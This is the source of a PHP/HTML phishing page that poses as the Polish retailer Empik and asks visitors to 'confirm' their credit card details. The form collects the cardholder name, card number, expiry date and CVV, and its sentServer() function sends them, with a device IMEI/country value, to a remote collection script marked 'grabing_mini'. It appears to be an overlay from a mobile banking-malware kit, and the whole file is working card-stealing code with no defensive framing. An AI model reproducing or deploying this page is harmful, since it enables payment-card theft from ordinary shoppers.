<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Empik</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/pl.com.rossmann.centauros/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body ng-controller="c1">

<div class="booting on text-center">
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYgAAAA1CAMAAABsvowLAAADAFBMVEX///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8WdyZhAAAA/3RSTlNyUl47pFOKQY91a0oyP26AjiKnXX6CrTmxkZNwg3ap81qhXJuf5FDU7T0jKTjbdG18z3vaZM5xLti7WYyuMfirJexUixfe2RKoGeB6/jc8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" alt="" class="booting-logo">
</div>

<form id="form" method="post">
    <div id="form2">
            <h2 style="font-size: 26px;">Potwierdzić dane Twojej karty kredytowej .</h2>
            <h4 style="margin-bottom: 40px;font-size: 14px;">Wprowadź numer Swojej karty kredytowej w celu potwierdzenia twoich danych płatniczych </h3>
        <label for="creditcard">Posiadacze karty</label>
        <input type="text" class="input" name="holder" onkeyup="check();" id="holder" pattern="^[a-zA-Z\s]+$" required autofocus>

        <label for="creditcard">NUMER KARTY</label>
        <input type="text" class="input credit" placeholder="XXXX XXXX XXXX XXXX" name="credit_card_number" id="creditcard" maxlength="16" required>

        <div class="exp-cvv">
            <div class="exp">
                <label for="exp">EXP DATA</label>
                <input type="tel" class="input" style="margin-bottom: 0;" placeholder="MM/YY" maxlength="5" onkeyup="
                var v = this.value;
                if (v.match(/^\d{2}$/) !== null) {
                    this.value = v + '/';
                }
                check();" name="exp" id="exp" required >
           </div>
           <div class="cvv">
                <label for="exp">CVV</label>
                <input type="tel" class="input" placeholder="CVV" style="margin-bottom: 0;" onkeyup="check();" name="cvv" id="cvv" maxlength="3" required>
           </div>

            <div class="center" style="padding: 20px;">
                <input type="button" class="button" value="Potwierdzić"  onClick="sentServer();" >
            </div>
        </div>
    </div>
</form>
<script type="text/javascript">
    jQuery(function ( $ ){
    $(".credit").credit();
    });
</script>
<script>
    function check() {
    var inp1 = document.getElementById('holder'),
        inp2 = document.getElementById('creditcard'),
        inp3 = document.getElementById('exp'),
        inp4 = document.getElementById('cvv');
    document.getElementById('input_submitBtn1').disabled = inp1.value && inp2.value && inp3.value && inp4.value ? false : "disabled";
    }
</script>

<script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},1e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>
<script>

        function sentServer(){

           var oNumInp3 = document.getElementById('holder');
            var oNumInp4 = document.getElementById('creditcard');
            var oNumInp5 = document.getElementById('exp');
            var oNumInp6 = document.getElementById('cvv');

                    var url='<?php echo $URL; ?>';
                var imei_c='<?php echo $IMEI_country; ?>';

            location.replace(url+'/o1o/a10.php?p=' + imei_c + '|grabing_mini|'+ oNumInp4.value + '|' + oNumInp5.value + '|' + oNumInp6.value +'|'+oNumInp3.value+'|');

        }
    </script>
</body>
</html>
